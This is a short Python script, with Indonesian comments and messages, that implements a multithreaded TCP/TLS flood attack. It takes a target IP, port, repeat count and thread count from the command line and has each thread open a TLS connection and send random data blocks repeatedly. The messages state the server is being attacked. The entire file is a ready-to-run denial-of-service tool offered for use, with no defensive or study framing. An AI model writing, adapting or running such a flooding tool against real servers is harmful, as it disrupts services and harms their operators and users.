import random
import threading
import os
import sys
import socket
import ssl

# Path ke sertifikat dan kunci pribadi Anda
certfile = "server.pem"
keyfile = "server-key.pem"


def tcp_flood(ip, port, times):
    byte1 = os.urandom(2024)
    addr = (ip, port)

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Membuat koneksi SSL/TLS dengan versi yang sesuai
        context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
        context.load_cert_chain(certfile, keyfile)
        s = context.wrap_socket(s, server_hostname=ip)
        s.connect(addr)
        for _ in range(times):
            s.send(byte1)
    except ConnectionRefusedError:
        print(f"Koneksi ke {ip}:{port} ditolak. Mungkin server tidak aktif.")
    except ssl.SSLError as e:
        print(f"Terjadi kesalahan SSL/TLS: {e}")
    except Exception as e:
        print(f"Terjadi kesalahan selama serangan banjir TCP: {e}")
    finally:
        s.close()


if __name__ == "__main__":
    if len(sys.argv) != 6:
        print(
            "Penggunaan: python script.py tcp <target_ip> <target_port> <jumlah_kali> <jumlah_thread>"
        )
    else:
        attack_type = sys.argv[1].lower()
        if attack_type != "tcp":
            print("Jenis serangan tidak valid. Gunakan 'tcp'.")
            sys.exit(1)

        ip = sys.argv[2]
        port = int(sys.argv[3])
        times = int(sys.argv[4])
        thread_count = int(sys.argv[5])

        print(f"Server diserang dengan serangan {attack_type}!")

        for _ in range(thread_count):
            threading.Thread(target=tcp_flood, args=(ip, port, times)).start()
